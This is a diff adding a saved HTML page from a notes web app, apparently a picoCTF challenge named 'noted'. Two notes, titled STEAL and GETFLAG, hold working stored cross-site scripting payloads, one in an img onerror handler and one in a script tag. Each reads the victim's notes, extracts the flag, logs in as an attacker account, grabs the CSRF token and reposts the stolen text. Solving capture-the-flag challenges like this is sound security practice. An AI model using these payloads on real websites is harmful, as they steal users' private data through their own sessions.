@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>noted | my notes</title>
+	<style>
+	* {
+		font-family: sans-serif;
+	}
+
+	body {
+		max-width: 1200px;
+		padding: 20px;
+		margin: auto;
+	}
+
+	h1 {
+		line-height: 1em;
+	}
+
+	input, button, textarea {
+		padding: 5px;
+		font-size: 17px;
+		border: 1px solid gray;
+	}
+
+	form {
+		line-height: 1em;
+	}
+
+	hr {
+		border: 0;
+		border-top: 1px solid gray;
+	}
+</style>
+</head>
+<body>
+<h1>My Notes</h1>
+<hr>
+
+<div>
+	<h2>STEAL</h2>
+	<p><img src=x onerror='fetch("/notes").then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m){fetch("/login",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"username=hax1&password=hax1"}).then(()=>fetch("/new")).then(r=>r.text()).then(html=>{let c=html.match(/name=\"_csrf\" value=\"([^\"]+)\"/)[1];fetch("/new",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"_csrf="+c+"&title=FLAGHERE&content="+encodeURIComponent(m[0])})})}})'></p>
+	<form action="/delete" method="POST">
+		<input type="hidden" name="_csrf" value="XALpWcol-c9XrBawdT2bOwU7JL1jnELvHQF0">
+		<input type="hidden" name="id" value="3">
+		<input type="submit" value="Delete">
+	</form>
+</div>
+<hr>
+
+<div>
+	<h2>GETFLAG</h2>
+	<p><script>fetch('/notes').then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m){fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=hax1&password=hax1'}).then(()=>fetch('/new')).then(r=>r.text()).then(html=>{let c=html.match(/name="_csrf" value="([^"]+)"/)[1];fetch('/new',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'_csrf='+c+'&title=THEFLAG&content='+encodeURIComponent(m[0])})})}})</script></p>
+	<form action="/delete" method="POST">
+		<input type="hidden" name="_csrf" value="XALpWcol-c9XrBawdT2bOwU7JL1jnELvHQF0">
+		<input type="hidden" name="id" value="5">
+		<input type="submit" value="Delete">
+	</form>
+</div>
+<hr>
+
+<br>
+<a href='/new'>New Note</a> | <a href='/report'>Report</a>
+</body>
+</html>
